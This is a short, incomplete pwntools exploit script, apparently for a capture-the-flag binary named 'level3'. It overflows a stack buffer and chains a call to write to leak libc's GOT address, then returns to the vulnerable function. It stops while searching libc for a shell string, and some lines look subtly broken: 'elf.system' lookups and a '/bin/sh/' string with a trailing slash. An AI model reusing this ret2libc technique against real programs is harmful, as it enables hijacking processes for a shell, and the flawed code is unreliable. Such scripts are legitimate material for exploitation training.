from pwn import *

libc = ELF("./libc_32.so.6")
elf = ELF("./level3")
     

io = process("./level3")     
     
payload = b"A"*140 #+b"A"*4    
write_addr = p32(elf.system[b'write'])

back_to_vul = p32(elf.system[b'vulnerable_function'])

param_1 = p32(0x1)
param_2 = p32(elf.got[b"write"])
param_3 = p32(0x4)

payload += write_addr + back_to_vul+param_1+param_2+param_3

print(io.read())
io.sendline(payload)

print(io.recv(4))
print(io.read())


sh_addr = libc.search(b"/bin/sh/")


 
            





